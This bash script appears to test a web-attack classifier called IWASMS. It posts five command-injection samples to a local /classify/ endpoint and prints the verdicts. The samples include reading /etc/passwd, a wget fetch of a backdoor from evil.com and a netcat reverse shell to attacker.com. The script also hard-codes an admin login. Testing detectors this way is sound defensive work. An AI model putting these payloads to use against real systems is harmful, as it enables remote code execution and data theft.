#!/bin/bash
# IWASMS — Command Injection Test Cases
BASE_URL="http://localhost:8000/api/v1"
TOKEN=$(curl -s -X POST "$BASE_URL/auth/login/" -H "Content-Type: application/json" -d '{"username":"admin","password":"admin123"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['data']['access'])")

echo "=== Command Injection Tests ==="
echo ""

echo "1. Semicolon cat:"
curl -s -X POST "$BASE_URL/classify/" \
  -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" \
  -d '{"method":"GET","url":"/api/ping?host=8.8.8.8; cat /etc/passwd","headers":{"User-Agent":"Mozilla/5.0"},"body":"","source_ip":"10.0.2.1"}' | python3 -m json.tool | grep -E "attack_type|confidence|severity"

echo ""
echo "2. Pipe to ls:"
curl -s -X POST "$BASE_URL/classify/" \
  -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" \
  -d '{"method":"GET","url":"/api/dns?domain=example.com| ls -la /","headers":{"User-Agent":"Mozilla/5.0"},"body":"","source_ip":"10.0.2.2"}' | python3 -m json.tool | grep -E "attack_type|confidence|severity"

echo ""
echo "3. wget download:"
curl -s -X POST "$BASE_URL/classify/" \
  -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" \
  -d '{"method":"GET","url":"/api/check?url=google.com && wget http://evil.com/backdoor.sh","headers":{"User-Agent":"Mozilla/5.0"},"body":"","source_ip":"10.0.2.3"}' | python3 -m json.tool | grep -E "attack_type|confidence|severity"

echo ""
echo "4. Reverse shell:"
curl -s -X POST "$BASE_URL/classify/" \
  -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" \
  -d '{"method":"POST","url":"/api/execute","headers":{"User-Agent":"Mozilla/5.0","Content-Type":"application/x-www-form-urlencoded"},"body":"cmd=; nc -e /bin/bash attacker.com 4444","source_ip":"10.0.2.4"}' | python3 -m json.tool | grep -E "attack_type|confidence|severity"

echo ""
echo "5. System info:"
curl -s -X POST "$BASE_URL/classify/" \
  -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" \
  -d '{"method":"GET","url":"/api/status?service=web; uname -a","headers":{"User-Agent":"Mozilla/5.0"},"body":"","source_ip":"10.0.2.5"}' | python3 -m json.tool | grep -E "attack_type|confidence|severity"
